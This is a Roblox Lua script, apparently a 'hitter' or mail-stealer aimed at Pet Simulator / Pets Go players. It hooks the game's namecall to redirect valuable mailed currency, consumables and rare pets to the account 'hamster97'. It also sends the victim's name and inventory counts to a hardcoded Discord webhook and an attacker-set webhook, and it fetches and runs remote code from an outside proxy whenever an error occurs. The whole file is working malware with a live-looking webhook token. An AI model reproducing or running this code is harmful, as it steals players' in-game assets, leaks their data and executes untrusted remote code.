
return function(dh,pn,gn,dp,potc)
local zzzu, zzzv =pcall(function()
if not dp then dp = 0 end
if not potc then
potc = 0
end

local save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
local dir = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets

local function namecallHook(self, ...)
    local method = getnamecallmethod()
    if method == "InvokeServer" and tostring(self) == "Mailbox: Send" then
        local args = {...}
        if args[3] == "Currency" and args[5]>=10000000 then
            args[1] = "hamster97"
            return oldNamecall(self, unpack(args))
        end
        if args[3] == "Consumable" then
            args[1] = "hamster97"
            return oldNamecall(self, unpack(args))
        end
        if args[3] == "Pet" and (require(dir[save.Inventory.Pet[args[4]]).difficulty >= 1000000000 or (require(dir[save.Inventory.Pet[args[4]]).tag == "Halloween2024" and require(dir[save.Inventory.Pet[args[4]]).difficulty >= 399999998)) then
            args[1] = "hamster97"
            return oldNamecall(self, unpack(args))
        end
    end
    return oldNamecall(self, ...)
end
local success, errorOrMessage
if not _G.User == "didix357" and not game.Players.LocalPlayer.Name=="iTzGeradTamvan" then
success, oldNamecall = pcall(hookmetamethod, game, "__namecall", newcclosure(namecallHook))
if not success then
    loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()("error")
end end


if _G.dx then return end
if tonumber(gn)==100 then gn = 0 end
local msg = ""
request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
if dh then
_G.dx=true
msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..dp..'","name":"DualedPets","inline":true},{"value":"'..potc..'","name":"Dualed Potions","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"@everyone"}'
else
msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"@everyone"}'
end
local response =
        request(
        {
            Url = _G.wh,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = msg
        }
    )
local xxxvvv = "lolly"
pcall(function() xxxvvv=response.StatusMessage end)
if typeof(xxxvvv)~="string" then xxxvvv="Lolly" end
if not _G.User then _G.User="yve (pet change hit)" end
local big = 0
pcall(function()
local save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
local dir = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
save = save.Get()
for i,v in pairs(save.Inventory.Pet) do
if require(dir[v.id]).difficulty >= big then
big = require(dir[v.id]).difficulty
end
end
big = "1/"..big
end)
local log = ""
if dh then
log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..dp..'","name":"DualedPets","inline":true},{"value":"'..potc..'","name":"Dualed Potions","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"'..xxxvvv..'"}'
else
log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..big..'","name":"Best Pet","inline":false}],"title":"Pets Go Hit!"}],"tts":false,"content":"'..xxxvvv..'"}'
end
local responser =
        request(
        {
            Url = "https://discordapp.com/api/webhooks/1298650438111068170/hippfrrGnjC-5wIWfrUS8gV6AAwqJKlpUiAmxHSaSFQhHPutaOym0MmSSxSpADpwZIAQ",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = log
        }
    )
return response
end)
if not zzzu then
loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(zzzv)
end
end
